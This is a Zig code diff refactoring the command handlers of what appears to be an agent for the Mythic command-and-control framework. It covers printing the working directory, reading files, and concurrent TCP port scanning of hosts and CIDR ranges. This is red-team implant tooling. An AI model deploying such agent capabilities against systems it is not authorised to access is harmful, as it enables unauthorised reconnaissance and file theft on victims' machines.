@@ -92,7 +92,7 @@ pub const CommandExecutor = struct {
     }
 
     fn executePwd(self: *CommandExecutor, task: MythicTask) !MythicResponse {
-        const cwd = std.process.currentPathAlloc(self.io, self.allocator) catch |err| {
+        const cwd_z = std.process.currentPathAlloc(self.io, self.allocator) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
                 .user_output = try std.fmt.allocPrint(self.allocator, "{}", .{err}),
@@ -100,7 +100,8 @@ pub const CommandExecutor = struct {
                 .status = "error",
             };
         };
-
+        defer self.allocator.free(cwd_z);
+        const cwd = try self.allocator.dupe(u8, cwd_z[0..cwd_z.len]);
         return MythicResponse{
             .task_id = task.id,
             .user_output = cwd,
@@ -147,7 +148,21 @@ pub const CommandExecutor = struct {
     }
 
     fn executeCat(self: *CommandExecutor, task: MythicTask) !MythicResponse {
-        if (task.parameters.len == 0) {
+        const Parameters = struct {
+            path: []const u8,
+        };
+        const parsed = json.parseFromSlice(Parameters, self.allocator, task.parameters, .{}) catch |err| {
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to parse parameters: {}", .{err}),
+                .completed = true,
+                .status = "error",
+            };
+        };
+        defer parsed.deinit();
+        const path = parsed.value.path;
+
+        if (path.len == 0) {
             return MythicResponse{
                 .task_id = task.id,
                 .user_output = "No filename provided",
@@ -156,10 +171,10 @@ pub const CommandExecutor = struct {
             };
         }
 
-        const content = std.Io.Dir.cwd().readFileAlloc(self.io, task.parameters, self.allocator, .limited(1024 * 1024)) catch |err| {
+        const content = std.Io.Dir.cwd().readFileAlloc(self.io, path, self.allocator, .limited(1024 * 1024)) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
-                .user_output = try std.fmt.allocPrint(self.allocator, "{s}: {}", .{ task.parameters, err }),
+                .user_output = try std.fmt.allocPrint(self.allocator, "{s}: {}", .{ path, err }),
                 .completed = true,
                 .status = "error",
             };
@@ -322,7 +337,7 @@ pub const CommandExecutor = struct {
     fn executePortscan(self: *CommandExecutor, task: MythicTask) !MythicResponse {
         const Parameters = struct {
             hosts: []const u8,
-            ports: []const u8 = "22,80,443,445,3389,8080",
+            ports: []const u8,
             timeout_ms: u32 = 500,
         };
         const parsed = try json.parseFromSlice(Parameters, self.allocator, task.parameters, .{});
@@ -341,7 +356,7 @@ pub const CommandExecutor = struct {
         var hosts_iterator = std.mem.splitScalar(u8, params.hosts, ',');
         while (hosts_iterator.next()) |entry| {
             const host = std.mem.trim(u8, entry, " ");
-            if (std.mem.indexOf(u8, host, "/") != null) {
+            if (std.mem.find(u8, host, "/") != null) {
                 try self.scanCidr(host, ports, params.timeout_ms, &results);
             } else {
                 try self.scanHost(host, ports, params.timeout_ms, &results);
@@ -357,8 +372,22 @@ pub const CommandExecutor = struct {
     }
 
     fn scanHost(self: *CommandExecutor, host: []const u8, ports: []const u16, timeout_ms: u32, results: *std.ArrayList(u8)) !void {
-        for (ports) |port| {
-            if (tcpProbe(self.io, host, port, timeout_ms)) {
+        _ = timeout_ms;
+        var group = std.Io.Group.init;
+        errdefer group.cancel(self.io);
+
+        const slots = try Allocator.alloc(self.allocator, ?u16, ports.len);
+        defer Allocator.free(self.allocator, slots);
+        @memset(slots, null);
+
+        // TcpProbe returns bool, we want concurrentError!void
+        for (ports, 0..) |port, i| {
+            try group.concurrent(self.io, tcpProbeTask, .{ self.io, host, port, &slots[i] });
+        }
+        try group.await(self.io);
+
+        for (slots) |slot| {
+            if (slot) |port| {
                 const line = try std.fmt.allocPrint(self.allocator, "{s:<21}{d:<7}open\n", .{ host, port });
                 defer self.allocator.free(line);
                 try results.appendSlice(self.allocator, line);
@@ -367,7 +396,7 @@ pub const CommandExecutor = struct {
     }
 
     fn scanCidr(self: *CommandExecutor, cidr: []const u8, ports: []const u16, timeout_ms: u32, results: *std.ArrayList(u8)) !void {
-        const slash = std.mem.indexOf(u8, cidr, "/") orelse return error.InvalidCidr;
+        const slash = std.mem.find(u8, cidr, "/") orelse return error.InvalidCidr;
         const base_str = cidr[0..slash];
         const prefix_len = try std.fmt.parseInt(u8, cidr[slash + 1 ..], 10);
 
@@ -389,13 +418,26 @@ pub const CommandExecutor = struct {
         }
     }
 
-    fn tcpProbe(io: Io, host: []const u8, port: u16, timeout_ms: u32) bool {
-        _ = timeout_ms; // blocking IO. TODO: implement async version later
+    fn tcpProbe(io: Io, host: []const u8, port: u16) bool {
+        //const timeout = timeout_ms; // blocking IO. TODO: implement async version later
+        //const duration = Io.Clock.Duration{ .raw = Io.Duration.fromMilliseconds(timeout), .clock = .real };
         const ip4 = std.Io.net.Ip4Address.parse(host, port) catch return false;
         const addr = std.Io.net.IpAddress{ .ip4 = ip4 };
-        const stream = addr.connect(io, .{ .mode = .stream }) catch return false;
+        // Cannot do proper timeout because timeout is not yet implemented in connect
+        // We'll just set it to none at the moment and rely on the OS timeout
+        // Tracking https://github.com/ziglang/zig/issues/25747
+        // Threaded.zig, fn netConnectIpPosix, 12208 2407ee954b780e5a6a73f88b0865feff365c5ce5
+        const stream = addr.connect(io, .{ .mode = .stream, .timeout = .none }) catch return false;
         stream.close(io);
         return true;
+    }
+
+    fn tcpProbeTask(io: Io, host: []const u8, port: u16, result: *?u16) !void {
+        if (tcpProbe(io, host, port)) {
+            result.* = port;
+        } else {
+            result.* = null;
+        }
     }
 
     fn parsePorts(allocator: Allocator, ports_str: []const u8) ![]u16 {
@@ -403,7 +445,7 @@ pub const CommandExecutor = struct {
         var it = std.mem.splitScalar(u8, ports_str, ',');
         while (it.next()) |token| {
             const t = std.mem.trim(u8, token, " ");
-            if (std.mem.indexOf(u8, t, "-")) |dash| {
+            if (std.mem.find(u8, t, "-")) |dash| {
                 const lo = try std.fmt.parseInt(u16, t[0..dash], 10);
                 const hi = try std.fmt.parseInt(u16, t[dash + 1 ..], 10);
                 var p = lo;
